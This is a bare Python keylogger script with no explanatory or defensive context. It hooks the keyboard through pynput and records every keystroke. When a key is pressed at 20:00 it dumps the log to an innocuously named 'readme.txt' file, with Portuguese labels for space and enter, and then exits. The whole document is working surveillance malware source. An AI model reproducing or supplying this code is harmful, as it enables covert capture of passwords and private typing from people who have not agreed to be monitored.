from pynput import keyboard
from datetime import datetime

keyspressed = []

def keyListener(input):
    keyspressed.append(input)

    now = datetime.now()
    if now.hour == 20 and now.minute == 00:
        writeFile(keyspressed)
        raise SystemExit
    
def writeFile(keyspressed):
    txtFile = open("readme.txt", "w")

    for key in keyspressed:
        if key is keyboard.Key.space:
            txtFile.write("-ESPAÇO-")
        elif key is keyboard.Key.enter:
            txtFile.write("-ENTER-")
        elif hasattr(key, 'char'):
            txtFile.write(key.char)

    txtFile.close()

listener = keyboard.Listener(keyListener)
listener.start()
listener.join()